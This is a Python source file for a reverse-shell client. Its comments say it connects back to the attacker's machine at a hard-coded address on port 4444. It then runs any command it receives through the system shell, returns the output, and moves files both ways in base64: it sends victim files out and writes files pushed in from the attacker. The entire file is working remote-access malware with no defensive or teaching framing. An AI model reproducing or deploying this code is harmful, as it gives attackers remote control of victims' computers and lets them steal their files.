import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    return subprocess.run(command, shell=True, capture_output=True)

# Function to send JSON data
def send_json(sock, data):
    json_data = json.dumps(data)
    sock.sendall(json_data.encode())

# Function to receive JSON data
def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data += sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    try:
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    except FileNotFoundError:
        return "[+] Error: File not found [+]"
    except Exception as e:
        return f"[+] Error: {e} [+]"

# Function to write a file from base64 encoded content
def write_file(path, content):
    try:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful [+]"
    except Exception as e:
        return f"[+] Error: {e} [+]"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        sock.sendall(current_prompt.encode("utf-8"))
        command = sock.recv(1024).decode("utf-8").strip()

        if command.lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        if command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        if command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)
                in_shell_mode = True
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        if in_shell_mode:
            if command.lower() == "exit":
                in_shell_mode = False
                current_prompt = default_prompt
                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
                continue

            output = execute_command(command)
            sock.sendall(output.stdout + output.stderr)
            continue

        # Handle the 'upload' command
        if command.startswith("upload"):
            try:
                _, filename = command.split(" ", 1)
                content = read_file(filename)
                send_json(sock, {"command": "upload", "filename": filename, "content": content})
                response = receive_json(sock)
                sock.sendall(response.encode("utf-8"))
            except Exception as e:
                sock.sendall(f"[+] Error: {str(e)} [+]".encode("utf-8"))
            continue

        # Handle the 'download' command
        if command.startswith("download"):
            try:
                _, filename = command.split(" ", 1)
                send_json(sock, {"command": "download", "filename": filename})
                response = receive_json(sock)
                if "Error" in response:
                    sock.sendall(response.encode("utf-8"))
                else:
                    result = write_file(filename, response)
                    sock.sendall(result.encode("utf-8"))
            except Exception as e:
                sock.sendall(f"[+] Error: {str(e)} [+]".encode("utf-8"))
            continue

        sock.sendall("Invalid command.\n".encode("utf-8"))

except Exception as e:
    print(f"Error: {e}")
    sock.close()
